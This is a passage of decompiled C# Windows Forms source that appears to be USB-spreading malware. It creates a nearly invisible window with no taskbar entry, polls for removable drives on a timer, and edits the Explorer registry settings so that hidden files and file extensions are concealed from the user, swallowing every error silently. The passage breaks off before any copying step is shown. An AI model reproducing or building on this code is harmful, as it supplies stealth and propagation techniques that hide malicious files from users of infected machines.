		Label obj20 = txt_a5;
		size = new Size(39, 13);
		((Control)obj20).set_Size(size);
		((Control)txt_a5).set_TabIndex(10);
		txt_a5.set_Text("Label5");
		((ListControl)lb_05).set_FormattingEnabled(true);
		ListBox obj21 = lb_05;
		location = new Point(532, 66);
		((Control)obj21).set_Location(location);
		((Control)lb_05).set_Name("lb_05");
		ListBox obj22 = lb_05;
		size = new Size(98, 95);
		((Control)obj22).set_Size(size);
		((Control)lb_05).set_TabIndex(9);
		txt_a6.set_AutoSize(true);
		Label obj23 = txt_a6;
		location = new Point(12, 200);
		((Control)obj23).set_Location(location);
		((Control)txt_a6).set_Name("txt_a6");
		Label obj24 = txt_a6;
		size = new Size(39, 13);
		((Control)obj24).set_Size(size);
		((Control)txt_a6).set_TabIndex(12);
		txt_a6.set_Text("Label6");
		((ListControl)lb_06).set_FormattingEnabled(true);
		ListBox obj25 = lb_06;
		location = new Point(15, 240);
		((Control)obj25).set_Location(location);
		((Control)lb_06).set_Name("lb_06");
		ListBox obj26 = lb_06;
		size = new Size(98, 95);
		((Control)obj26).set_Size(size);
		((Control)lb_06).set_TabIndex(11);
		Timer_1.set_Enabled(true);
		Timer_1.set_Interval(300);
		txt_a7.set_AutoSize(true);
		Label obj27 = txt_a7;
		location = new Point(127, 200);
		((Control)obj27).set_Location(location);
		((Control)txt_a7).set_Name("txt_a7");
		Label obj28 = txt_a7;
		size = new Size(39, 13);
		((Control)obj28).set_Size(size);
		((Control)txt_a7).set_TabIndex(14);
		txt_a7.set_Text("Label7");
		((ListControl)lb_07).set_FormattingEnabled(true);
		ListBox obj29 = lb_07;
		location = new Point(130, 240);
		((Control)obj29).set_Location(location);
		((Control)lb_07).set_Name("lb_07");
		ListBox obj30 = lb_07;
		size = new Size(98, 95);
		((Control)obj30).set_Size(size);
		((Control)lb_07).set_TabIndex(13);
		txt_a8.set_AutoSize(true);
		Label obj31 = txt_a8;
		location = new Point(252, 200);
		((Control)obj31).set_Location(location);
		((Control)txt_a8).set_Name("txt_a8");
		Label obj32 = txt_a8;
		size = new Size(39, 13);
		((Control)obj32).set_Size(size);
		((Control)txt_a8).set_TabIndex(16);
		txt_a8.set_Text("Label8");
		((ListControl)lb_08).set_FormattingEnabled(true);
		ListBox obj33 = lb_08;
		location = new Point(255, 240);
		((Control)obj33).set_Location(location);
		((Control)lb_08).set_Name("lb_08");
		ListBox obj34 = lb_08;
		size = new Size(98, 95);
		((Control)obj34).set_Size(size);
		((Control)lb_08).set_TabIndex(15);
		txt_a9.set_AutoSize(true);
		Label obj35 = txt_a9;
		location = new Point(399, 200);
		((Control)obj35).set_Location(location);
		((Control)txt_a9).set_Name("txt_a9");
		Label obj36 = txt_a9;
		size = new Size(39, 13);
		((Control)obj36).set_Size(size);
		((Control)txt_a9).set_TabIndex(18);
		txt_a9.set_Text("Label9");
		((ListControl)lb_09).set_FormattingEnabled(true);
		ListBox obj37 = lb_09;
		location = new Point(402, 240);
		((Control)obj37).set_Location(location);
		((Control)lb_09).set_Name("lb_09");
		ListBox obj38 = lb_09;
		size = new Size(98, 95);
		((Control)obj38).set_Size(size);
		((Control)lb_09).set_TabIndex(17);
		txt_a10.set_AutoSize(true);
		Label obj39 = txt_a10;
		location = new Point(529, 200);
		((Control)obj39).set_Location(location);
		((Control)txt_a10).set_Name("txt_a10");
		Label obj40 = txt_a10;
		size = new Size(45, 13);
		((Control)obj40).set_Size(size);
		((Control)txt_a10).set_TabIndex(20);
		txt_a10.set_Text("Label10");
		((ListControl)lb_10).set_FormattingEnabled(true);
		ListBox obj41 = lb_10;
		location = new Point(532, 240);
		((Control)obj41).set_Location(location);
		((Control)lb_10).set_Name("lb_10");
		ListBox obj42 = lb_10;
		size = new Size(98, 95);
		((Control)obj42).set_Size(size);
		((Control)lb_10).set_TabIndex(19);
		txt_a11.set_AutoSize(true);
		Label obj43 = txt_a11;
		location = new Point(12, 359);
		((Control)obj43).set_Location(location);
		((Control)txt_a11).set_Name("txt_a11");
		Label obj44 = txt_a11;
		size = new Size(45, 13);
		((Control)obj44).set_Size(size);
		((Control)txt_a11).set_TabIndex(40);
		txt_a11.set_Text("Label11");
		((ListControl)lb_11).set_FormattingEnabled(true);
		ListBox obj45 = lb_11;
		location = new Point(15, 399);
		((Control)obj45).set_Location(location);
		((Control)lb_11).set_Name("lb_11");
		ListBox obj46 = lb_11;
		size = new Size(98, 95);
		((Control)obj46).set_Size(size);
		((Control)lb_11).set_TabIndex(39);
		txt_a12.set_AutoSize(true);
		Label obj47 = txt_a12;
		location = new Point(127, 359);
		((Control)obj47).set_Location(location);
		((Control)txt_a12).set_Name("txt_a12");
		Label obj48 = txt_a12;
		size = new Size(45, 13);
		((Control)obj48).set_Size(size);
		((Control)txt_a12).set_TabIndex(38);
		txt_a12.set_Text("Label12");
		((ListControl)lb_12).set_FormattingEnabled(true);
		ListBox obj49 = lb_12;
		location = new Point(130, 399);
		((Control)obj49).set_Location(location);
		((Control)lb_12).set_Name("lb_12");
		ListBox obj50 = lb_12;
		size = new Size(98, 95);
		((Control)obj50).set_Size(size);
		((Control)lb_12).set_TabIndex(37);
		txt_a13.set_AutoSize(true);
		Label obj51 = txt_a13;
		location = new Point(252, 359);
		((Control)obj51).set_Location(location);
		((Control)txt_a13).set_Name("txt_a13");
		Label obj52 = txt_a13;
		size = new Size(45, 13);
		((Control)obj52).set_Size(size);
		((Control)txt_a13).set_TabIndex(36);
		txt_a13.set_Text("Label13");
		((ListControl)lb_13).set_FormattingEnabled(true);
		ListBox obj53 = lb_13;
		location = new Point(255, 399);
		((Control)obj53).set_Location(location);
		((Control)lb_13).set_Name("lb_13");
		ListBox obj54 = lb_13;
		size = new Size(98, 95);
		((Control)obj54).set_Size(size);
		((Control)lb_13).set_TabIndex(35);
		txt_a14.set_AutoSize(true);
		Label obj55 = txt_a14;
		location = new Point(393, 359);
		((Control)obj55).set_Location(location);
		((Control)txt_a14).set_Name("txt_a14");
		Label obj56 = txt_a14;
		size = new Size(45, 13);
		((Control)obj56).set_Size(size);
		((Control)txt_a14).set_TabIndex(34);
		txt_a14.set_Text("Label14");
		((ListControl)lb_14).set_FormattingEnabled(true);
		ListBox obj57 = lb_14;
		location = new Point(396, 399);
		((Control)obj57).set_Location(location);
		((Control)lb_14).set_Name("lb_14");
		ListBox obj58 = lb_14;
		size = new Size(98, 95);
		((Control)obj58).set_Size(size);
		((Control)lb_14).set_TabIndex(33);
		txt_a15.set_AutoSize(true);
		Label obj59 = txt_a15;
		location = new Point(529, 359);
		((Control)obj59).set_Location(location);
		((Control)txt_a15).set_Name("txt_a15");
		Label obj60 = txt_a15;
		size = new Size(45, 13);
		((Control)obj60).set_Size(size);
		((Control)txt_a15).set_TabIndex(32);
		txt_a15.set_Text("Label15");
		((ListControl)lb_15).set_FormattingEnabled(true);
		ListBox obj61 = lb_15;
		location = new Point(532, 399);
		((Control)obj61).set_Location(location);
		((Control)lb_15).set_Name("lb_15");
		ListBox obj62 = lb_15;
		size = new Size(98, 95);
		((Control)obj62).set_Size(size);
		((Control)lb_15).set_TabIndex(31);
		txt_a16.set_AutoSize(true);
		Label obj63 = txt_a16;
		location = new Point(12, 514);
		((Control)obj63).set_Location(location);
		((Control)txt_a16).set_Name("txt_a16");
		Label obj64 = txt_a16;
		size = new Size(45, 13);
		((Control)obj64).set_Size(size);
		((Control)txt_a16).set_TabIndex(30);
		txt_a16.set_Text("Label16");
		((ListControl)lb_16).set_FormattingEnabled(true);
		ListBox obj65 = lb_16;
		location = new Point(15, 554);
		((Control)obj65).set_Location(location);
		((Control)lb_16).set_Name("lb_16");
		ListBox obj66 = lb_16;
		size = new Size(98, 95);
		((Control)obj66).set_Size(size);
		((Control)lb_16).set_TabIndex(29);
		txt_a17.set_AutoSize(true);
		Label obj67 = txt_a17;
		location = new Point(127, 514);
		((Control)obj67).set_Location(location);
		((Control)txt_a17).set_Name("txt_a17");
		Label obj68 = txt_a17;
		size = new Size(45, 13);
		((Control)obj68).set_Size(size);
		((Control)txt_a17).set_TabIndex(28);
		txt_a17.set_Text("Label17");
		((ListControl)lb_17).set_FormattingEnabled(true);
		ListBox obj69 = lb_17;
		location = new Point(130, 554);
		((Control)obj69).set_Location(location);
		((Control)lb_17).set_Name("lb_17");
		ListBox obj70 = lb_17;
		size = new Size(98, 95);
		((Control)obj70).set_Size(size);
		((Control)lb_17).set_TabIndex(27);
		txt_a18.set_AutoSize(true);
		Label obj71 = txt_a18;
		location = new Point(246, 514);
		((Control)obj71).set_Location(location);
		((Control)txt_a18).set_Name("txt_a18");
		Label obj72 = txt_a18;
		size = new Size(45, 13);
		((Control)obj72).set_Size(size);
		((Control)txt_a18).set_TabIndex(26);
		txt_a18.set_Text("Label18");
		((ListControl)lb_18).set_FormattingEnabled(true);
		ListBox obj73 = lb_18;
		location = new Point(249, 554);
		((Control)obj73).set_Location(location);
		((Control)lb_18).set_Name("lb_18");
		ListBox obj74 = lb_18;
		size = new Size(98, 95);
		((Control)obj74).set_Size(size);
		((Control)lb_18).set_TabIndex(25);
		txt_a19.set_AutoSize(true);
		Label obj75 = txt_a19;
		location = new Point(399, 514);
		((Control)obj75).set_Location(location);
		((Control)txt_a19).set_Name("txt_a19");
		Label obj76 = txt_a19;
		size = new Size(45, 13);
		((Control)obj76).set_Size(size);
		((Control)txt_a19).set_TabIndex(24);
		txt_a19.set_Text("Label19");
		((ListControl)lb_19).set_FormattingEnabled(true);
		ListBox obj77 = lb_19;
		location = new Point(402, 554);
		((Control)obj77).set_Location(location);
		((Control)lb_19).set_Name("lb_19");
		ListBox obj78 = lb_19;
		size = new Size(98, 95);
		((Control)obj78).set_Size(size);
		((Control)lb_19).set_TabIndex(23);
		txt_a20.set_AutoSize(true);
		Label obj79 = txt_a20;
		location = new Point(529, 514);
		((Control)obj79).set_Location(location);
		((Control)txt_a20).set_Name("txt_a20");
		Label obj80 = txt_a20;
		size = new Size(45, 13);
		((Control)obj80).set_Size(size);
		((Control)txt_a20).set_TabIndex(22);
		txt_a20.set_Text("Label20");
		((ListControl)lb_20).set_FormattingEnabled(true);
		ListBox obj81 = lb_20;
		location = new Point(532, 554);
		((Control)obj81).set_Location(location);
		((Control)lb_20).set_Name("lb_20");
		ListBox obj82 = lb_20;
		size = new Size(84, 95);
		((Control)obj82).set_Size(size);
		((Control)lb_20).set_TabIndex(21);
		txt_a21.set_AutoSize(true);
		Label obj83 = txt_a21;
		location = new Point(12, 689);
		((Control)obj83).set_Location(location);
		((Control)txt_a21).set_Name("txt_a21");
		Label obj84 = txt_a21;
		size = new Size(45, 13);
		((Control)obj84).set_Size(size);
		((Control)txt_a21).set_TabIndex(50);
		txt_a21.set_Text("Label21");
		((ListControl)lb_21).set_FormattingEnabled(true);
		ListBox obj85 = lb_21;
		location = new Point(15, 729);
		((Control)obj85).set_Location(location);
		((Control)lb_21).set_Name("lb_21");
		ListBox obj86 = lb_21;
		size = new Size(98, 95);
		((Control)obj86).set_Size(size);
		((Control)lb_21).set_TabIndex(49);
		txt_a22.set_AutoSize(true);
		Label obj87 = txt_a22;
		location = new Point(127, 689);
		((Control)obj87).set_Location(location);
		((Control)txt_a22).set_Name("txt_a22");
		Label obj88 = txt_a22;
		size = new Size(45, 13);
		((Control)obj88).set_Size(size);
		((Control)txt_a22).set_TabIndex(48);
		txt_a22.set_Text("Label22");
		((ListControl)lb_22).set_FormattingEnabled(true);
		ListBox obj89 = lb_22;
		location = new Point(130, 729);
		((Control)obj89).set_Location(location);
		((Control)lb_22).set_Name("lb_22");
		ListBox obj90 = lb_22;
		size = new Size(98, 95);
		((Control)obj90).set_Size(size);
		((Control)lb_22).set_TabIndex(47);
		txt_a23.set_AutoSize(true);
		Label obj91 = txt_a23;
		location = new Point(246, 689);
		((Control)obj91).set_Location(location);
		((Control)txt_a23).set_Name("txt_a23");
		Label obj92 = txt_a23;
		size = new Size(45, 13);
		((Control)obj92).set_Size(size);
		((Control)txt_a23).set_TabIndex(46);
		txt_a23.set_Text("Label23");
		((ListControl)lb_23).set_FormattingEnabled(true);
		ListBox obj93 = lb_23;
		location = new Point(249, 729);
		((Control)obj93).set_Location(location);
		((Control)lb_23).set_Name("lb_23");
		ListBox obj94 = lb_23;
		size = new Size(98, 95);
		((Control)obj94).set_Size(size);
		((Control)lb_23).set_TabIndex(45);
		txt_a24.set_AutoSize(true);
		Label obj95 = txt_a24;
		location = new Point(399, 689);
		((Control)obj95).set_Location(location);
		((Control)txt_a24).set_Name("txt_a24");
		Label obj96 = txt_a24;
		size = new Size(45, 13);
		((Control)obj96).set_Size(size);
		((Control)txt_a24).set_TabIndex(44);
		txt_a24.set_Text("Label24");
		((ListControl)lb_24).set_FormattingEnabled(true);
		ListBox obj97 = lb_24;
		location = new Point(402, 729);
		((Control)obj97).set_Location(location);
		((Control)lb_24).set_Name("lb_24");
		ListBox obj98 = lb_24;
		size = new Size(98, 95);
		((Control)obj98).set_Size(size);
		((Control)lb_24).set_TabIndex(43);
		txt_a25.set_AutoSize(true);
		Label obj99 = txt_a25;
		location = new Point(529, 689);
		((Control)obj99).set_Location(location);
		((Control)txt_a25).set_Name("txt_a25");
		Label obj100 = txt_a25;
		size = new Size(45, 13);
		((Control)obj100).set_Size(size);
		((Control)txt_a25).set_TabIndex(52);
		txt_a25.set_Text("Label25");
		((ListControl)lb_25).set_FormattingEnabled(true);
		ListBox obj101 = lb_25;
		location = new Point(532, 729);
		((Control)obj101).set_Location(location);
		((Control)lb_25).set_Name("lb_25");
		ListBox obj102 = lb_25;
		size = new Size(98, 95);
		((Control)obj102).set_Size(size);
		((Control)lb_25).set_TabIndex(51);
		ProgressBar obj103 = pb_exper1;
		location = new Point(987, 84);
		((Control)obj103).set_Location(location);
		((Control)pb_exper1).set_Name("pb_exper1");
		ProgressBar obj104 = pb_exper1;
		size = new Size(100, 23);
		((Control)obj104).set_Size(size);
		((Control)pb_exper1).set_TabIndex(53);
		Timer_2.set_Enabled(true);
		Timer_3.set_Enabled(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(10, 10);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)pb_exper1);
		((Control)this).get_Controls().Add((Control)(object)txt_a25);
		((Control)this).get_Controls().Add((Control)(object)lb_25);
		((Control)this).get_Controls().Add((Control)(object)txt_a21);
		((Control)this).get_Controls().Add((Control)(object)lb_21);
		((Control)this).get_Controls().Add((Control)(object)txt_a22);
		((Control)this).get_Controls().Add((Control)(object)lb_22);
		((Control)this).get_Controls().Add((Control)(object)txt_a23);
		((Control)this).get_Controls().Add((Control)(object)lb_23);
		((Control)this).get_Controls().Add((Control)(object)txt_a24);
		((Control)this).get_Controls().Add((Control)(object)lb_24);
		((Control)this).get_Controls().Add((Control)(object)txt_a11);
		((Control)this).get_Controls().Add((Control)(object)lb_11);
		((Control)this).get_Controls().Add((Control)(object)txt_a12);
		((Control)this).get_Controls().Add((Control)(object)lb_12);
		((Control)this).get_Controls().Add((Control)(object)txt_a13);
		((Control)this).get_Controls().Add((Control)(object)lb_13);
		((Control)this).get_Controls().Add((Control)(object)txt_a14);
		((Control)this).get_Controls().Add((Control)(object)lb_14);
		((Control)this).get_Controls().Add((Control)(object)txt_a15);
		((Control)this).get_Controls().Add((Control)(object)lb_15);
		((Control)this).get_Controls().Add((Control)(object)txt_a16);
		((Control)this).get_Controls().Add((Control)(object)lb_16);
		((Control)this).get_Controls().Add((Control)(object)txt_a17);
		((Control)this).get_Controls().Add((Control)(object)lb_17);
		((Control)this).get_Controls().Add((Control)(object)txt_a18);
		((Control)this).get_Controls().Add((Control)(object)lb_18);
		((Control)this).get_Controls().Add((Control)(object)txt_a19);
		((Control)this).get_Controls().Add((Control)(object)lb_19);
		((Control)this).get_Controls().Add((Control)(object)txt_a20);
		((Control)this).get_Controls().Add((Control)(object)lb_20);
		((Control)this).get_Controls().Add((Control)(object)txt_a10);
		((Control)this).get_Controls().Add((Control)(object)lb_10);
		((Control)this).get_Controls().Add((Control)(object)txt_a9);
		((Control)this).get_Controls().Add((Control)(object)lb_09);
		((Control)this).get_Controls().Add((Control)(object)txt_a8);
		((Control)this).get_Controls().Add((Control)(object)lb_08);
		((Control)this).get_Controls().Add((Control)(object)txt_a7);
		((Control)this).get_Controls().Add((Control)(object)lb_07);
		((Control)this).get_Controls().Add((Control)(object)txt_a6);
		((Control)this).get_Controls().Add((Control)(object)lb_06);
		((Control)this).get_Controls().Add((Control)(object)txt_a5);
		((Control)this).get_Controls().Add((Control)(object)lb_05);
		((Control)this).get_Controls().Add((Control)(object)txt_a4);
		((Control)this).get_Controls().Add((Control)(object)lb_04);
		((Control)this).get_Controls().Add((Control)(object)txt_a3);
		((Control)this).get_Controls().Add((Control)(object)lb_03);
		((Control)this).get_Controls().Add((Control)(object)txt_a2);
		((Control)this).get_Controls().Add((Control)(object)lb_02);
		((Control)this).get_Controls().Add((Control)(object)txt_a1);
		((Control)this).get_Controls().Add((Control)(object)pb_add);
		((Control)this).get_Controls().Add((Control)(object)lb_01);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("ma");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text(" ");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Timer_0_Tick(object sender, EventArgs e)
	{
		pb_add.Increment(1);
		if (pb_add.get_Value() == 5)
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			foreach (string text in logicalDrives)
			{
				DriveInfo driveInfo = new DriveInfo(text);
				if (driveInfo.DriveType == DriveType.Removable)
				{
					lb_01.get_Items().Add((object)text);
				}
			}
			string[] logicalDrives2 = Environment.GetLogicalDrives();
			foreach (string text2 in logicalDrives2)
			{
				DriveInfo driveInfo2 = new DriveInfo(text2);
				if (driveInfo2.DriveType == DriveType.Removable)
				{
					lb_02.get_Items().Add((object)text2);
				}
			}
			string[] logicalDrives3 = Environment.GetLogicalDrives();
			foreach (string text3 in logicalDrives3)
			{
				DriveInfo driveInfo3 = new DriveInfo(text3);
				if (driveInfo3.DriveType == DriveType.Removable)
				{
					lb_03.get_Items().Add((object)text3);
				}
			}
			string[] logicalDrives4 = Environment.GetLogicalDrives();
			foreach (string text4 in logicalDrives4)
			{
				DriveInfo driveInfo4 = new DriveInfo(text4);
				if (driveInfo4.DriveType == DriveType.Removable)
				{
					lb_04.get_Items().Add((object)text4);
				}
			}
			string[] logicalDrives5 = Environment.GetLogicalDrives();
			foreach (string text5 in logicalDrives5)
			{
				DriveInfo driveInfo5 = new DriveInfo(text5);
				if (driveInfo5.DriveType == DriveType.Removable)
				{
					lb_05.get_Items().Add((object)text5);
				}
			}
			string[] logicalDrives6 = Environment.GetLogicalDrives();
			foreach (string text6 in logicalDrives6)
			{
				DriveInfo driveInfo6 = new DriveInfo(text6);
				if (driveInfo6.DriveType == DriveType.Removable)
				{
					lb_06.get_Items().Add((object)text6);
				}
			}
			string[] logicalDrives7 = Environment.GetLogicalDrives();
			foreach (string text7 in logicalDrives7)
			{
				DriveInfo driveInfo7 = new DriveInfo(text7);
				if (driveInfo7.DriveType == DriveType.Removable)
				{
					lb_07.get_Items().Add((object)text7);
				}
			}
			string[] logicalDrives8 = Environment.GetLogicalDrives();
			foreach (string text8 in logicalDrives8)
			{
				DriveInfo driveInfo8 = new DriveInfo(text8);
				if (driveInfo8.DriveType == DriveType.Removable)
				{
					lb_08.get_Items().Add((object)text8);
				}
			}
			string[] logicalDrives9 = Environment.GetLogicalDrives();
			foreach (string text9 in logicalDrives9)
			{
				DriveInfo driveInfo9 = new DriveInfo(text9);
				if (driveInfo9.DriveType == DriveType.Removable)
				{
					lb_09.get_Items().Add((object)text9);
				}
			}
			string[] logicalDrives10 = Environment.GetLogicalDrives();
			foreach (string text10 in logicalDrives10)
			{
				DriveInfo driveInfo10 = new DriveInfo(text10);
				if (driveInfo10.DriveType == DriveType.Removable)
				{
					lb_10.get_Items().Add((object)text10);
				}
			}
			string[] logicalDrives11 = Environment.GetLogicalDrives();
			foreach (string text11 in logicalDrives11)
			{
				DriveInfo driveInfo11 = new DriveInfo(text11);
				if (driveInfo11.DriveType == DriveType.Removable)
				{
					lb_11.get_Items().Add((object)text11);
				}
			}
			string[] logicalDrives12 = Environment.GetLogicalDrives();
			foreach (string text12 in logicalDrives12)
			{
				DriveInfo driveInfo12 = new DriveInfo(text12);
				if (driveInfo12.DriveType == DriveType.Removable)
				{
					lb_12.get_Items().Add((object)text12);
				}
			}
			string[] logicalDrives13 = Environment.GetLogicalDrives();
			foreach (string text13 in logicalDrives13)
			{
				DriveInfo driveInfo13 = new DriveInfo(text13);
				if (driveInfo13.DriveType == DriveType.Removable)
				{
					lb_13.get_Items().Add((object)text13);
				}
			}
			string[] logicalDrives14 = Environment.GetLogicalDrives();
			foreach (string text14 in logicalDrives14)
			{
				DriveInfo driveInfo14 = new DriveInfo(text14);
				if (driveInfo14.DriveType == DriveType.Removable)
				{
					lb_14.get_Items().Add((object)text14);
				}
			}
			string[] logicalDrives15 = Environment.GetLogicalDrives();
			foreach (string text15 in logicalDrives15)
			{
				DriveInfo driveInfo15 = new DriveInfo(text15);
				if (driveInfo15.DriveType == DriveType.Removable)
				{
					lb_15.get_Items().Add((object)text15);
				}
			}
			string[] logicalDrives16 = Environment.GetLogicalDrives();
			foreach (string text16 in logicalDrives16)
			{
				DriveInfo driveInfo16 = new DriveInfo(text16);
				if (driveInfo16.DriveType == DriveType.Removable)
				{
					lb_16.get_Items().Add((object)text16);
				}
			}
			string[] logicalDrives17 = Environment.GetLogicalDrives();
			foreach (string text17 in logicalDrives17)
			{
				DriveInfo driveInfo17 = new DriveInfo(text17);
				if (driveInfo17.DriveType == DriveType.Removable)
				{
					lb_17.get_Items().Add((object)text17);
				}
			}
			string[] logicalDrives18 = Environment.GetLogicalDrives();
			foreach (string text18 in logicalDrives18)
			{
				DriveInfo driveInfo18 = new DriveInfo(text18);
				if (driveInfo18.DriveType == DriveType.Removable)
				{
					lb_18.get_Items().Add((object)text18);
				}
			}
			string[] logicalDrives19 = Environment.GetLogicalDrives();
			foreach (string text19 in logicalDrives19)
			{
				DriveInfo driveInfo19 = new DriveInfo(text19);
				if (driveInfo19.DriveType == DriveType.Removable)
				{
					lb_19.get_Items().Add((object)text19);
				}
			}
			string[] logicalDrives20 = Environment.GetLogicalDrives();
			foreach (string text20 in logicalDrives20)
			{
				DriveInfo driveInfo20 = new DriveInfo(text20);
				if (driveInfo20.DriveType == DriveType.Removable)
				{
					lb_20.get_Items().Add((object)text20);
				}
			}
			string[] logicalDrives21 = Environment.GetLogicalDrives();
			foreach (string text21 in logicalDrives21)
			{
				DriveInfo driveInfo21 = new DriveInfo(text21);
				if (driveInfo21.DriveType == DriveType.Removable)
				{
					lb_21.get_Items().Add((object)text21);
				}
			}
			string[] logicalDrives22 = Environment.GetLogicalDrives();
			foreach (string text22 in logicalDrives22)
			{
				DriveInfo driveInfo22 = new DriveInfo(text22);
				if (driveInfo22.DriveType == DriveType.Removable)
				{
					lb_22.get_Items().Add((object)text22);
				}
			}
			string[] logicalDrives23 = Environment.GetLogicalDrives();
			foreach (string text23 in logicalDrives23)
			{
				DriveInfo driveInfo23 = new DriveInfo(text23);
				if (driveInfo23.DriveType == DriveType.Removable)
				{
					lb_23.get_Items().Add((object)text23);
				}
			}
			string[] logicalDrives24 = Environment.GetLogicalDrives();
			foreach (string text24 in logicalDrives24)
			{
				DriveInfo driveInfo24 = new DriveInfo(text24);
				if (driveInfo24.DriveType == DriveType.Removable)
				{
					lb_24.get_Items().Add((object)text24);
				}
			}
			string[] logicalDrives25 = Environment.GetLogicalDrives();
			foreach (string text25 in logicalDrives25)
			{
				DriveInfo driveInfo25 = new DriveInfo(text25);
				if (driveInfo25.DriveType == DriveType.Removable)
				{
					lb_25.get_Items().Add((object)text25);
				}
			}
		}
		if (pb_add.get_Value() == 10)
		{
			try
			{
				RegistryKey registryKey = ((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
				registryKey.SetValue("Hidden", 2);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey2 = ((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
				registryKey2.SetValue("HideFileExt", 1);
				registryKey2.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_01.set_SelectedIndex(0);
				txt_a1.set_Text(lb_01.get_Text());
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_02.set_SelectedIndex(1);
				txt_a2.set_Text(lb_02.get_Text());
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_03.set_SelectedIndex(2);
				txt_a3.set_Text(lb_03.get_Text());
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_04.set_SelectedIndex(3);
				txt_a4.set_Text(lb_04.get_Text());
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_05.set_SelectedIndex(4);
				txt_a5.set_Text(lb_05.get_Text());
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_06.set_SelectedIndex(5);
				txt_a6.set_Text(lb_06.get_Text());
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_07.set_SelectedIndex(6);
				txt_a6.set_Text(lb_07.get_Text());
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_08.set_SelectedIndex(7);
				txt_a8.set_Text(lb_08.get_Text());
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_09.set_SelectedIndex(8);
				txt_a9.set_Text(lb_09.get_Text());
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_10.set_SelectedIndex(9);
				txt_a10.set_Text(lb_10.get_Text());
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_11.set_SelectedIndex(10);
				txt_a11.set_Text(lb_11.get_Text());
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_12.set_SelectedIndex(11);
				txt_a12.set_Text(lb_12.get_Text());
			}
			catch (Exception projectError14)
			{
				ProjectData.SetProjectError(projectError14);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_13.set_SelectedIndex(12);
				txt_a13.set_Text(lb_13.get_Text());
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_14.set_SelectedIndex(13);
				txt_a14.set_Text(lb_14.get_Text());
			}
			catch (Exception projectError16)
			{
				ProjectData.SetProjectError(projectError16);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_15.set_SelectedIndex(14);
				txt_a15.set_Text(lb_15.get_Text());
			}
			catch (Exception projectError17)
			{
				ProjectData.SetProjectError(projectError17);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_16.set_SelectedIndex(15);
				txt_a16.set_Text(lb_16.get_Text());
			}
			catch (Exception projectError18)
			{
				ProjectData.SetProjectError(projectError18);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_17.set_SelectedIndex(16);
				txt_a17.set_Text(lb_17.get_Text());
			}
			catch (Exception projectError19)
			{
				ProjectData.SetProjectError(projectError19);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_18.set_SelectedIndex(17);
				txt_a18.set_Text(lb_18.get_Text());
			}
			catch (Exception projectError20)
			{
				ProjectData.SetProjectError(projectError20);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_19.set_SelectedIndex(18);
				txt_a19.set_Text(lb_19.get_Text());
			}
			catch (Exception projectError21)
			{
				ProjectData.SetProjectError(projectError21);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_20.set_SelectedIndex(19);
				txt_a20.set_Text(lb_20.get_Text());
			}
			catch (Exception projectError22)
			{
				ProjectData.SetProjectError(projectError22);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_21.set_SelectedIndex(20);
				txt_a21.set_Text(lb_21.get_Text());
			}
			catch (Exception projectError23)
			{
				ProjectData.SetProjectError(projectError23);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_22.set_SelectedIndex(21);
				txt_a21.set_Text(lb_22.get_Text());
			}
			catch (Exception projectError24)
			{
				ProjectData.SetProjectError(projectError24);
				ProjectData.ClearProjectError();
			}
			try
			{
				lb_23.set_SelectedIndex(22);
